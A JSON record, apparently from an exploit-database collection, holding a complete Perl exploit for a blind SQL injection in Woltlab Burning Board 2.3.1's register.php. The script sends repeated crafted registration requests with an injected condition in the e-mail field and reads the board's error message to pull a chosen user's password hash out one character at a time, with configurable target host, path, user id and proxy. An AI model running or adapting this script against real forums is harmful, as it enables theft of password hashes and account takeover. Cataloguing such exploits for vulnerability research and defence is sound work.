{
  "id": "1006",
  "title": "Woltlab Burning Board 2.3.1 - &#039;register.php&#039; SQL Injection",
  "cve": null,
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n\r\nuse strict;\r\nuse IO::Socket::INET;\r\n\r\n\r\n$| = print \"\r\nWoltlab Burning Board <= 2.3.1 Exploit\r\nVulnerability discovered by GulfTech Security Research\r\nVisit www.security-project.org\r\nExploit by deluxe89\r\n----------\r\n\";\r\n\r\n\r\n\r\nmy $host = 'www.security-project.org';\r\nmy $path = '/wbb2/'; # path to the board\r\nmy $userid = 1; # the password hash will be from the user with this id\r\nmy $username = 'deluxe89'; # any username from the board\r\nmy $proxy = ''; # proxy, you can leave this empty\r\nmy $error = 'E-Mail-Adresse ist unzul&auml;ssig'; # use 'email address entered is already ta' for english boards\r\n\r\n\r\n# proxy handling\r\nmy ($addr, $port) = ($proxy ne '') ? split(/:/, $proxy) : ($host, 80);\r\nif($proxy ne '')\r\n{\r\n       print \"[~] Using a proxy\\n\";\r\n}\r\nelse\r\n{\r\n       print \"[~] You're using NO proxy!\\n\";\r\n       sleep(1);\r\n}\r\n\r\n\r\n\r\n\r\n\r\n#\r\n# Get the hash\r\n#\r\n\r\nprint \"[~] Getting the hash. Please wait some minutes..\\n[+] Hash: \";\r\n\r\n\r\nmy $hash = '';\r\nfor(my $i=1;$i<33;$i++)\r\n{\r\n       my $sock = new IO::Socket::INET(PeerAddr => $addr, PeerPort => $port, Proto => 'tcp', Timeout => 8) or die('[-] Could not connect to server');\r\n\r\n       if(&test($i, 96)) # buchstabe\r\n       {\r\n               for(my $c=97;$c<103;$c++)\r\n               {\r\n                       if(&test($i, $c, 1))\r\n                       {\r\n                               print pack('c', $c);\r\n                               last;\r\n                       }\r\n               }\r\n       }\r\n       else # zahl\r\n       {\r\n               #print \"0-4\\n\";\r\n               for(my $c=48;$c<58;$c++)\r\n               {\r\n                       if(&test($i, $c, 1))\r\n                       {\r\n                               print pack('c', $c);\r\n                               last;\r\n                       }\r\n               }\r\n       }\r\n}\r\nprint \"\\n\";\r\n\r\n\r\nsub test\r\n{\r\n       my ($i, $num, $g) = @_;\r\n\r\n       my $sock = new IO::Socket::INET(PeerAddr => $addr, PeerPort => $port, Proto => 'tcp', Timeout => 8) or die('Could not connect to server');\r\n       my $value = \"sre4sdffr\\@4g54asd5.org' OR (userid=$userid AND ascii(substring(password,$i,1))\";\r\n       $value .= ($g) ? '=' : '>';\r\n       $value .= \"$num)/*\";\r\n       my $data = \"r_username=$username&r_email=$value&r_password=aaaaaaaa&r_confirmpassword=aaaaaaaa&r_homepage=&r_icq=&r_aim=&r_yim=&r_msn=&r_day=0&r_month=0&r_year=&r_gender=0&r_signature=&r_usertext=&field%5B1%5D=&field%5B2%5D=&field%5B3%5D=&r_invisible=0&r_usecookies=1&r_admincanemail=1&r_showemail=1&r_usercanemail=1&r_emailnotify=0&r_notificationperpm=0&r_receivepm=1&r_emailonpm=0&r_pmpopup=0&r_showsignatures=1&r_showavatars=1&r_showimages=1&r_daysprune=0&r_umaxposts=0&r_threadview=0&r_dateformat=d.m.Y&r_timeformat=H%3Ai&r_startweek=1&r_timezoneoffset=1&r_usewysiwyg=0&r_styleid=0&r_langid=0&send=send&sid=&disclaimer=viewed\";\r\n\r\n       print $sock \"POST http://$host${path}register.php HTTP/1.1\\r\\nHost: $host\\r\\nConnection: Close\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: \".length($data).\"\\r\\n\\r\\n$data\\r\\n\";\r\n\r\n\r\n       while(<$sock>)\r\n       {\r\n               if($_ =~ m/$error/) { return 1; }\r\n       }\r\n       return 0;\r\n}\r\n\r\n# milw0rm.com [2005-05-20]",
  "url": "https://www.exploit-db.com/exploits/1006"
}